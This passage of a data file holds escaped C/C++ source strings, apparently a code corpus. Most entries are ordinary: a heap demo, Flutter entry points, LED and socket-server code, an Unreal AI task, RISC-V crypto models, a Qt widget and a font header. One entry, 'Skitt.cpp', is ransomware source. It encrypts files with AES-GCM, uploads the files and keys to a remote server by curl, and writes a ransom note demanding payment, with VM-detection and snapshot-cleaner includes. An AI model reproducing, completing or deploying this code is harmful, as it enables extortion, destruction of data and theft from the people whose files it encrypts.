maxHeap.insert(10);\n    maxHeap.insert(20);\n    maxHeap.insert(15);\n    maxHeap.insert(30);\n    maxHeap.insert(40);\n\n    cout << \"Heap after insertions: \";\n    maxHeap.printHeap();\n\n    cout << \"Maximum element: \" << maxHeap.getExtreme() << endl;\n\n    cout << \"Deleting the maximum element...\\n\";\n    maxHeap.deleteExtreme();\n    cout << \"Heap after deleting the maximum element: \";\n    maxHeap.printHeap();\n\n    cout << \"Checking if value is in range (10 to 25): \";\n    cout << (maxHeap.inRange(10, 25) ? \"Yes\" : \"No\") << endl;\n\n    cout << \"Deleting a specific value (15)...\\n\";\n    maxHeap.deleteValue(15);\n    cout << \"Heap after deleting the value: \";\n    maxHeap.printHeap();\n\n    // Create a Min-Heap\n    Heap minHeap(true);\n\n    cout << \"\\nInserting values into the Min-Heap...\\n\";\n    minHeap.insert(50);\n    minHeap.insert(60);\n    minHeap.insert(40);\n    minHeap.insert(70);\n    minHeap.insert(30);\n\n    cout << \"Heap after insertions: \";\n    minHeap.printHeap();\n\n    cout << \"Minimum element: \" << minHeap.getExtreme() << endl;\n\n    cout << \"Deleting the minimum element...\\n\";\n    minHeap.deleteExtreme();\n    cout << \"Heap after ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"login\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"LedUtils.h\"\n\nstruct Life *L=(Life *)malloc(sizeof(struct Life)*LIVES);\nfloat ramp[]={\n  0, 0.01, 0.02, 0.04, 0.08,  0.16, 0.32, .36, .4, .45, .5, .55, .6, .65, .7, .75, .8, .85, .9, .95,\n  1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n  .95, .9, .85, .8, .75, .7, .65, .6, .55, .5, .45, .4, .36, .32, .16,  0.08, 0.04, 0.02, 0.01, 0\n};\n\n// ----- RGB LED code -----\n\n// int rs = sizeof(ramp)/sizeof(ramp[0]); // ramp size\n\nvoid lightRGB(uint8_t r, uint8_t g, uint8_t b){\n  if (RGB_PIN < 0){\n    log_v(\"Skipped lightRGB because RGB_PIN<0\");\n    return;\n  }\n  rgbLedWriteOrdered(RGB_PIN, LED_COLOR_ORDER_RGB, r, g, b);\n}\nvoid breath(struct Life lf, int bs) \n{\n  int s = bs;\n  lightRGB(uint8_t(lf.r*ramp[s]), uint8_t(lf.g*ramp[s]), uint8_t(lf.b*ramp[s]) );\n}\n\n// void ledBreath(int r=-1,int g=-1, int b=-1, int rgb_delay=50) {\nvoid ledBreath(int r,int g, int b, int rgb_delay) {\n  if (RGB_PIN < 0){\n    log_v(\"Skipped ledBreath because RGB_PIN<0\");\n    return;\n  }\n  int l=0;\n  if(r<0) r=rand()%RGB_BRIGHTNESS;\n  if(g<0) g=rand()%RGB_BRIGHTNESS;\n  if(b<0) b=rand()%RGB_BRIGHTNESS;\n  L[l].r=r;\n  L[l].g=g;\n  L[l].b=b;\n  int ramp_n = sizeof(ramp)/sizeof(ramp[0]);\n  for(int b=0; b<ramp_n; b++){\n    breath(L[l], b);\n     vTaskDelay(rgb_delay/portTICK_PERIOD_MS);\n  }\n}\n",
    "#include \"api.hpp\"\n#include <iostream>\n#include <sstream>\n#include <thread>\n#include <vector>\n#ifdef _WIN32\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#else\n#include <unistd.h>\n#include <sys/socket.h>\n#include <Kernel/netinet/in.h>\n#endif\n#pragma comment(lib, \"Ws2_32.lib\")\n#include \"../Algorithm/algorithm.cpp\"\n#include \"../Formatting/conversionJson.hpp\"\n#include \"../Formatting/conversionXml.hpp\"\n\nvoid Api::closeSocket(int socket) {\n#ifdef _WIN32\n    closesocket(socket); // Use Winsock's closesocket on Windows\n#else\n    close(socket);       // Use POSIX's close on Linux/macOS\n#endif\n}\n\n// Constructor to initialize the API with a specific port\nApi::Api(int port) : port(port), server_socket(-1) {}\n\nvoid Api::start() {\n#ifdef _WIN32\n    WSADATA wsa_data;\n    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {\n        std::cerr << \"WSAStartup failed\\n\";\n        exit(EXIT_FAILURE);\n    }\n#endif\n\n    server_socket = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_socket < 0) {\n        perror(\"Socket creation failed\");\n#ifdef _WIN32\n        WSACleanup();\n#endif\n        exit(EXIT_FAILURE);\n    }\n\n    // Set SO_REUSEADDR to avoid \"address already in use\" errors\n    int opt = 1;\n    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {\n        perror(\"setsockopt failed\");\n        closeSocket(server_socket);\n        exit(EXIT_FAILURE);\n    }\n\n    sockaddr_in serverAddr{};\n    serverAddr.sin_family = AF_INET;\n    serverAddr.sin_addr.s_addr = INADDR_ANY;\n    serverAddr.sin_port = htons(port);\n\n    int bind_result = ::bind(server_socket, (sockaddr*)&serverAddr, sizeof(serverAddr));\nif (bind_result < 0) {\n    perror(\"Bind failed\");\n    closeSocket(server_socket);\n#ifdef _WIN32\n    WSACleanup();\n#endif\n    exit(EXIT_FAILURE);\n}\n\n    if (listen(server_socket, SOMAXCONN) < 0) {\n        perror(\"Listen failed\");\n        closeSocket(server_socket);\n#ifdef _WIN32\n        WSACleanup();\n#endif\n        exit(EXIT_FAILURE);\n    }\n\n    std::cout << \"Server running on port \" << port << \"...\\n\";\n\n    while (true) {\n        int client_socket = accept(server_socket, nullptr, nullptr);\n        if (client_socket < 0) {\n            perror(\"Accept failed\");\n            continue;\n        }\n\n        std::thread(&Api::handleClient, this, client_socket).detach();\n    }\n}\n\nvoid Api::handleClient(int client_socket) {\n    try {\n        char buffer[1024] = {0};\n        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);\n\n        if (bytes_received <= 0) {\n            closeSocket(client_socket);\n            return;\n        }\n\n        std::string request(buffer, bytes_received);\n        std::string response = processRequest(request);\n\n        send(client_socket, response.c_str(), response.size(), 0);\n    } catch (const std::exception &e) {\n        std::cerr << \"Error handling client: \" << e.what() << std::endl;\n    }\n\n    closeSocket(client_socket);\n}\n\nstd::string Api::createHttpResponse(const std::string &body, const std::string &content_type) {\n    std::ostringstream response;\n    response << \"HTTP/1.1 200 OK\\r\\n\"\n             << \"Content-Type: \" << content_type << \"\\r\\n\"\n             << \"Content-Length: \" << body.size() << \"\\r\\n\"\n             << \"Connection: close\\r\\n\"\n             << \"\\r\\n\"\n             << body;\n    return response.str();\n}\n\nstd::string Api::processRequest(const std::string &request) {\n    // Find the starting position of the query string\n    size_t query_pos = request.find(\"/route?\");\n    if (query_pos == std::string::npos) {\n        return generateErrorResponse(\"Invalid request path\", 400);\n    }\n\n    // Extract the query string\n    query_pos += 7; // Skip \"/route?\"\n    size_t end_pos = request.find(\" \", query_pos); // End of the query\n    std::string query_string = request.substr(query_pos, end_pos - query_pos);\n\n    // Parse the query string for parameters\n    std::string source, destination, format;\n    std::istringstream query_stream(query_string);\n    std::string param;\n\n    while (std::getline(query_stream, param, '&')) {\n        size_t eq_pos = param.find('=');\n        if (eq_pos == std::string::npos) continue;\n\n        std::string key = param.substr(0, eq_pos);\n        std::string value = param.substr(eq_pos + 1);\n\n        if (key == \"source\") {\n            source = value;\n        } else if (key == \"destination\") {\n            destination = value;\n        } else if (key == \"format\") {\n            format = value;\n        }\n    }\n\n    // Validate parameters\n    if (source.empty() || destination.empty()) {\n        return generateErrorResponse(\"Source or destination cannot be empty\", 400);\n    }\n\n    // Perform your graph traversal using the parsed parameters\n    int start = std::stoi(source);\n    int end = std::stoi(destination);\n    double path_time;\n\n    std::vector<int> path = modifiedDijkstra(graph, start, end, &path_time);\n\n    // Generate JSON, XML or plain text response based on the format\n    if (format == \"json\") {\n        convertIntoJson(path, path_time);\n        re",
    "// Skitt.cpp\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstdlib>\n#include <filesystem>\n#include <regex>\n#include <openssl/evp.h>\n#include <openssl/rand.h>\n#include <openssl/pem.h>\n#include <curl/curl.h>\n#include <future>\n#include <mutex>\n#include <set>\n#include <sstream>\n#include <iomanip>\n#include \"vm_detector.h\"\n#include \"snapshot_cleaner.h\"\n\nnamespace fs = std::filesystem;\n\nconstexpr size_t AES_KEY_LENGTH = 32;\nconstexpr size_t AES_IV_LENGTH = 16;\nconstexpr size_t AES_TAG_LENGTH = 16;\n\nstd::mutex fileMutex;\nstd::set<std::string> ransomNoteDirs;\nstd::vector<std::pair<std::string, std::string>> encryptionKeys;\n\nstd::string bytesToHex(const unsigned char *bytes, size_t length) {\n    std::ostringstream oss;\n    for (size_t i = 0; i < length; ++i) {\n        oss << std::hex << std::setw(2) << std::setfill('0') << (int)bytes[i];\n    }\n    return oss.str();\n}\n\nbool generateRandomKey(unsigned char *buffer, size_t length) {\n    return RAND_bytes(buffer, length) == 1;\n}\n\nbool encryptFileAESGCM(const std::string &filePath, const unsigned char *key, const unsigned char *iv) {\n    std::ifstream inputFile(filePath, std::ios::binary);\n    if (!inputFile) return false;\n\n    std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());\n    inputFile.close();\n\n    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();\n    if (!ctx) return false;\n\n    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) <= 0 ||\n        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv) <= 0) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n\n    std::vector<unsigned char> encryptedData(fileData.size() + AES_TAG_LENGTH);\n    int len = 0;\n\n    if (EVP_EncryptUpdate(ctx, encryptedData.data(), &len, fileData.data(), fileData.size()) <= 0) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n\n    int finalLen = 0;\n    if (EVP_EncryptFinal_ex(ctx, encryptedData.data() + len, &finalLen) <= 0) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n\n    unsigned char tag[AES_TAG_LENGTH];\n    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_LENGTH, tag) <= 0) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n\n    encryptedData.resize(len + finalLen);\n    std::string encryptedFilePath = filePath + \".enc\";\n    std::ofstream outputFile(encryptedFilePath, std::ios::binary);\n    if (!outputFile) {\n        EVP_CIPHER_CTX_free(ctx);\n        return false;\n    }\n\n    outputFile.write(reinterpret_cast<const char *>(encryptedData.data()), encryptedData.size());\n    outputFile.write(reinterpret_cast<const char *>(tag), AES_TAG_LENGTH);\n    outputFile.close();\n\n    EVP_CIPHER_CTX_free(ctx);\n\n    {\n        std::lock_guard<std::mutex> lock(fileMutex);\n        encryptionKeys.emplace_back(bytesToHex(key, AES_KEY_LENGTH), bytesToHex(iv, AES_IV_LENGTH));\n    }\n\n    ransomNoteDirs.insert(fs::path(filePath).parent_path().string());\n    return true;\n}\n\nbool sendFileAndKeysToServer(const std::string &filePath, const std::string &keyHex, const std::string &ivHex) {\n    CURL *curl = curl_easy_init();\n    if (!curl) return false;\n\n    curl_mime *mime = curl_mime_init(curl);\n    curl_mimepart *part = curl_mime_addpart(mime);\n\n    curl_mime_name(part, \"file\");\n    curl_mime_filedata(part, filePath.c_str());\n\n    part = curl_mime_addpart(mime);\n    curl_mime_name(part, \"key\");\n    curl_mime_data(part, keyHex.c_str(), CURL_ZERO_TERMINATED);\n\n    part = curl_mime_addpart(mime);\n    curl_mime_name(part, \"iv\");\n    curl_mime_data(part, ivHex.c_str(), CURL_ZERO_TERMINATED);\n\n    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);\n    curl_easy_setopt(curl, CURLOPT_URL, \"https://you_server_name.com/upload-file\");\n    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);\n\n    CURLcode res = curl_easy_perform(curl);\n    bool success = (res == CURLE_OK);\n\n    curl_mime_free(mime);\n    curl_easy_cleanup(curl);\n\n    return success;\n}\n\nvoid encryptFilesInThread(const std::vector<std::string> &files, const unsigned char *key, const unsigned char *iv) {\n    for (const auto &file : files) {\n        encryptFileAESGCM(file, key, iv);\n    }\n}\n\nvoid createRansomNote(const std::string &directory) {\n    std::string ransomNotePath = directory + \"/Skitlock.txt\";\n\n    std::ofstream ransomNoteFile(ransomNotePath);\n    if (!ransomNoteFile) return;\n\n    ransomNoteFile << \"==============================================\\n\"\n                   << \"          YOUR FILES HAVE BEEN ENCRYPTED      \\n\"\n                   << \"==============================================\\n\\n\"\n                   << \"Your files have been encrypted using strong AES-128 encryption.\\n\"\n                   << \"To recover your files, please follow these steps:\\n\\n\"\n                   << \"1. Visit our payment page: http://example.com/payment\\n\"\n                   << \"2. Use this email for support: support@example.com\\n\"\n                   << \"3. After payment, you will receive a decryption key.\\n\\n\"\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"BTT_ChargeAttack.h\"\n#include \"AIController.h\"\n#include \"GameFramework/Character.h\"\n#include \"BehaviorTree/BlackboardComponent.h\"\n#include \"Navigation/PathFollowingComponent.h\"\n#include \"ERobotStates.h\"\n#include \"Navigation/PathFollowingComponent.h\"\n#include \"Animations/RobotAnimInstance.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n\n\n\nvoid UBTT_ChargeAttack::TickTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory, float DeltaSeconds)\n{\n\tbool bCanSeePlayer = OwnerComp.GetBlackboardComponent()->GetValueAsBool(TEXT(\"CanSeePlayer\"));\n\n\tif (!bCanSeePlayer)\n\t{\n\t\tFinishLatentTask(OwnerComp, EBTNodeResult::Succeeded);\n\t\treturn;\n\t}\n\n\tif (!bIsFinished) { return; }\n\tif (bCanCharge) { return; }\n\n}\n\n\nEBTNodeResult::Type UBTT_ChargeAttack::ExecuteTask(UBehaviorTreeComponent& OwnerComp, uint8* NodeMemory)\n{\n\tControllerRef = OwnerComp.GetAIOwner();\n\tCharacterRef = ControllerRef->GetCharacter();\n\tRobotAnim = Cast<URobotAnimInstance>(CharacterRef->GetMesh()->GetAnimInstance());\n\n\n\tOwnerComp.GetBlackboardComponent()->SetValueAsEnum(TEXT(\"CurrentState\"),static_cast<uint8>(ERobotStates::Charge));\n\n\tRobotAnim->bIsCharging = true;\n\n\tif (const APawn* PlayerRef = Cast<APawn>(OwnerComp.GetBlackboardComponent()->GetValueAsObject(TEXT(\"Player\")));PlayerRef)\n\t{\n\t\tconst FVector PlayerLocation = PlayerRef->GetActorLocation();\n\n\t\tOwnerComp.GetBlackboardComponent()->SetValueAsEnum(TEXT(\"CurrentState\"),static_cast<uint8>(ERobotStates::Charge));\n\n\t\tFAIMoveRequest MoveRequest{ PlayerLocation };\n\t\tMoveRequest.SetUsePathfinding(true);\n\t\tControllerRef->MoveTo(MoveRequest);\n\n\t\tOriginalWalkSpeed = CharacterRef->GetCharacterMovement()->MaxWalkSpeed;\n\t\tCharacterRef->GetCharacterMovement()->MaxWalkSpeed = ChargeAttackSpeed;\n\n\t\tbIsFinished = false;\n\t\tbCanCharge = false;\n\n\t\treturn EBTNodeResult::InProgress;\n\t}\n\n\treturn EBTNodeResult::Aborted;\n}\n\nvoid UBTT_ChargeAttack::ChargeAtPlayer()\n{\n\t\n\tAPawn* PlayerRef{GetWorld()->GetFirstPlayerController()->GetPawn()};\n\n\tconst FVector PlayerLocation{ PlayerRef->GetActorLocation() };\n\n\tFAIMoveRequest MoveRequest{ PlayerLocation };\n\tMoveRequest.SetUsePathfinding(true);\n\n\tControllerRef->MoveTo(MoveRequest);\n\tControllerRef->SetFocus(PlayerRef);\n\n\tControllerRef->ReceiveMoveCompleted.AddUnique(MoveCompletedDelegate);\n\n\tOriginalWalkSpeed = CharacterRef->GetCharacterMovement()->MaxWalkSpeed;\n\n\tCharacterRef->GetCharacterMovement()->MaxWalkSpeed = ChargeAttackSpeed;\n\n\n\n}\n\n\nvoid UBTT_ChargeAttack::FinishAttackTask()\n{\n\tUE_LOG(LogTemp, Warning, TEXT(\"Task Finished!\"));\n}\n\nvoid UBTT_ChargeAttack::StartCoolDown()\n{\n\tbCanCharge = false;\n\tGetWorld()->GetTimerManager().SetTimer(ChargeCooldownTimerHandle, this, &UBTT_ChargeAttack::EndCooldown, ChargeCooldownDuration, false);\n}\n\nvoid UBTT_ChargeAttack::EndCooldown()\n{\n\tbCanCharge = true;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"store_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Hector.h\"\n#include <stdio.h>\n#include <math.h>\n#include <ac_int.h>\n#include <rac.h>\n#include <aes_common.h>\n#include <sm4_common.h>\n#include <sha_common.h>\n#include <string>\n#include <vector>\nusing namespace std;\n\n// RAC begin\n\ntypedef ac_int<2, false> ui2;\ntypedef ac_int<4, false> ui4;\ntypedef ac_int<5, false> ui5;\ntypedef ac_int<6, false> ui6;\ntypedef ac_int<7, false> ui7;\ntypedef ac_int<8, false> ui8;\ntypedef ac_int<32, false> ui32;\ntypedef ac_int<64, false> ui64;\ntypedef ac_int<8, true> si8;\ntypedef ac_int<16, true> si16;\ntypedef ac_int<32, true> si32;\ntypedef ac_int<64, true> si64;\n\n// bku optype begin\nui64 rv_clmul(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  ui64 rd_tmp = 0;\n  int i;\n  for(i=0;i<=63;i++){\n  \tif((rs2 >> i) & ui64(1)) {\n  \t\trd_tmp = rd_tmp ^ (rs1 << i);\n  \t}\n  }\n  rd = rd_tmp;\n  return rd;\n}\n\nui64 rv_clmulh(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  ui64 rd_tmp = 0;\n  int i;\n  for(i=0;i<=63;i++){\n  \tif((rs2 >> i) & ui64(1)) {\n  \t\trd_tmp = rd_tmp ^ (rs1 >> (64-i));\n  \t}\n  }\n  rd = rd_tmp;\n  return rd;\n}\n\nui64 rv_clmulr(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  ui64 rd_tmp = 0;\n  int i;\n  for(i=0;i<=63;i++){\n  \tif((rs2 >> i) & ui64(1)) {\n  \t\trd_tmp = rd_tmp ^ (rs1 >> (64-i-1));\n  \t}\n  }\n  rd = rd_tmp;\n  return rd;\n}\n\nui4 xperm4_lookup(ui4 idx, ui64 lut) {\n  ui64 tmp;\n  ui4 lookup;\n  tmp = lut >> (idx*4);\n  lookup = tmp.slc<4>(0);\n  return lookup;\n}\n\nui64 rv_xpermn(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  ui64 result = 0;\n  int i;\n  for(i=0;i<64;i=i+4){\n  \t\tresult.set_slc(i,xperm4_lookup(rs2.slc<4>(i),rs1));\n  }\n  rd = result;\n  return rd;\n}\n\nui8 xperm8_lookup(ui8 idx, ui64 lut) {\n  ui64 tmp;\n  ui8 lookup;\n  tmp = lut >> (idx*8);\n  lookup = tmp.slc<8>(0);\n  return lookup;\n}\n\nui64 rv_xpermb(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  ui64 result = 0;\n  int i;\n  for(i=0;i<64;i=i+8){\n  \t\tresult.set_slc(i,xperm8_lookup(rs2.slc<8>(i),rs1));\n  }\n  rd = result;\n  return rd;\n}\n\nint HighestSetBit(ui64 x) {\n  int i;\n  int bit = -1;\n  for(i=64-1;i>=0;i--){\n  \tif ((x[i] == 1) && (bit == -1)) {\n      bit = i;\n    }\n  }\n  return bit;\n}\n\nui64 rv_clz(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  rd = (64-1) - HighestSetBit(rs1);\n  return rd;\n}\n\nint HighestSetBit32(ui64 x) {\n  int i;\n  int bit = -1;\n  for(i=32-1;i>=0;i--){\n  \tif ((x[i] == 1) && (bit == -1)) {\n      bit = i;\n    }\n  }\n  return bit;\n}\n\nui64 rv_clzw(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  rd = (32-1) - HighestSetBit32(rs1);\n  return rd;\n}\n\nint LowestSetBit(ui64 x) {\n  int i;\n  int bit = 64;\n  for(i=0;i<64;i++){\n  \tif ((x[i] == 1) && (bit == 64)) {\n      bit = i;\n    }\n  }\n  return bit;\n}\n\nui64 rv_ctz(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  rd = LowestSetBit(rs1);\n  return rd;\n}\n\nint LowestSetBit32(ui64 x) {\n  int i;\n  int bit = 32;\n  for(i=0;i<32;i++){\n  \tif ((x[i] == 1) && (bit == 32)) {\n      bit = i;\n    }\n  }\n  return bit;\n}\n\nui64 rv_ctzw(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  rd = LowestSetBit32(rs1);\n  return rd;\n}\n\nui64 rv_cpop(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  int i;\n  int bitcount = 0;\n  for(i=0;i<64;i++){\n  \tif (rs1[i] == 1) {\n      bitcount = bitcount + 1;\n    }\n  }\n  rd = bitcount;\n  return rd;\n}\n\nui64 rv_cpopw(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  int i;\n  int bitcount = 0;\n  for(i=0;i<32;i++){\n  \tif (rs1[i] == 1) {\n      bitcount = bitcount + 1;\n    }\n  }\n  rd = bitcount;\n  return rd;\n}\n\nui64 rv_aes64es(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  uint64_t temp;\n  temp = AES_SHIFROWS_LO((uint64_t)rs1,(uint64_t)rs2);\n  temp = (\n    ((uint64_t)AES_ENC_SBOX[(temp >>  0) & 0xFF] <<  0) |\n    ((uint64_t)AES_ENC_SBOX[(temp >>  8) & 0xFF] <<  8) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 16) & 0xFF] << 16) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 24) & 0xFF] << 24) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 32) & 0xFF] << 32) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 40) & 0xFF] << 40) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 48) & 0xFF] << 48) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 56) & 0xFF] << 56)\n    );\n  rd = temp;\n  return rd;\n}\n\nui64 rv_aes64esm(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  uint64_t temp;\n  temp = AES_SHIFROWS_LO((uint64_t)rs1,(uint64_t)rs2);\n  temp = (\n    ((uint64_t)AES_ENC_SBOX[(temp >>  0) & 0xFF] <<  0) |\n    ((uint64_t)AES_ENC_SBOX[(temp >>  8) & 0xFF] <<  8) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 16) & 0xFF] << 16) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 24) & 0xFF] << 24) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 32) & 0xFF] << 32) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 40) & 0xFF] << 40) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 48) & 0xFF] << 48) |\n    ((uint64_t)AES_ENC_SBOX[(temp >> 56) & 0xFF] << 56)\n    );\n\n  uint64_t col_0 = temp & 0xFFFFFFFF;\n  uint64_t col_1 = temp >> 32;\n\n  col_0 = AES_MIXCOLUMN(col_0);\n  col_1 = AES_MIXCOLUMN(col_1);\n\n  rd = ((uint64_t)col_1 <<32) | col_0;\n  return rd;\n}\n\nui64 rv_aes64ds(ui64 rs1, ui64 rs2) {\n  ui64 rd;\n  uint64_t temp;\n  temp = AES_INVSHIFROWS_LO((uint64_t)rs1,(uint64_t)rs2);\n  temp = (\n    ((uint64_t)AES_DEC_SBOX[(temp >>  0) & 0xFF] <<  0) |\n    ((uint64_t)AES_DEC_SBOX[(temp >>  8) & 0xFF] <<  8) |\n    ((uint64_t)AES_DEC_SBOX[(temp >> 16) & 0xFF] << 16)",
    "#include \"Column.h\"\n\nnamespace qontrol {\n\nColumn::Column(QWidget *parent) : QWidget(parent) {\n    auto *layout = new QVBoxLayout;\n    layout->setContentsMargins(0, 0, 0, 0);\n    layout->setSpacing(0);\n    QWidget::setLayout(layout);\n}\n\nauto Column::push(QWidgetItem *item) -> Column* {\n    this->layout()->addItem(item);\n    return this;\n}\n\nauto Column::push(QWidget *widget) -> Column* {\n    this->layout()->addWidget(widget);\n    return this;\n}\n\nauto Column::push(std::optional<QWidget*> opt_widget) -> Column* {\n    if (opt_widget.has_value()) {\n        this->push(opt_widget.value());\n    }\n    return this;\n}\n\nauto Column::push(QLayout *layout) -> Column* {\n    this->layout()->addLayout(layout);\n    return this;\n}\n\nauto Column::widget() -> QWidget* {\n    return this;\n}\n\nauto Column::pushSpacer() -> Column* {\n    this->layout()->addStretch();\n    return this;\n}\n\nauto Column::pushSpacer(int height) -> Column* {\n    this->layout()->addSpacing(height);\n    return this;\n}\n\nauto Column::pushStretch(int factor) -> Column* {\n    this->layout()->addStretch(factor);\n    return this;\n}\n\n// NOTE:we need to override this method in order to impeach consumer to change layout type\nvoid Column::setLayout(QLayout *layout) { // NOLINT\n    qCritical() << \"Layout of a Column cannot be changed\";\n}\n\n// we need override the method in order to return a QHBoxLayout* because \n// addLayout() is is not implemented on QLayout\nauto Column::layout() -> QVBoxLayout* {\n    QLayout* currentLayout = QWidget::layout();\n    auto* vboxLayout = dynamic_cast<QVBoxLayout*>(currentLayout);\n    if (vboxLayout == nullptr) {\n        qFatal() << \"layout is not of type QVBoxLayout!\";\n    }\n    return vboxLayout;\n\n}\n\nvoid Column::clear() {\n    auto *layout = new QVBoxLayout;\n    layout->setContentsMargins(0, 0, 0, 0);\n    layout->setSpacing(0);\n    delete this->layout();\n    QWidget::setLayout(layout);\n}\n\n} // namespace qontrol\n",
    "/**\r\n  ******************************************************************************\r\n  * @file    Font12.c\r\n  * @author  MCD Application Team\r\n  * @version V1.0.0\r\n  * @date    18-February-2014\r\n  * @brief   This file provides text Font12 for STM32xx-EVAL's LCD driver. \r\n  ******************************************************************************\r\n  * @attention\r\n  *\r\n  * <h2><center>&copy; COPYRIGHT(c) 2014 STMicroelectronics</center></h2>\r\n  *\r\n  * Redistribution and use in source and binary forms, with or without modification,\r\n  * are permitted provided that the following conditions are met:\r\n  *   1. Redistributions of source code must retain the above copyright notice,\r\n  *      this list of conditions and the following disclaimer.\r\n  *   2. Redistributions in binary form must reproduce the above copyright notice,\r\n  *      this list of conditions and the following disclaimer in the documentation\r\n  *      and/or other materials provided with the distribution.\r\n  *   3. Neither the name of STMicroelectronics nor the names of its contributors\r\n  *      may be used to endorse or promote products derived from this software\r\n  *      without specific prior written permission.\r\n  *\r\n  * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\r\n  * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\r\n  * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\r\n  * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\r\n  * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\n  * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\n  * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\r\n  * CAUSED AND ON ANY THEORY OF 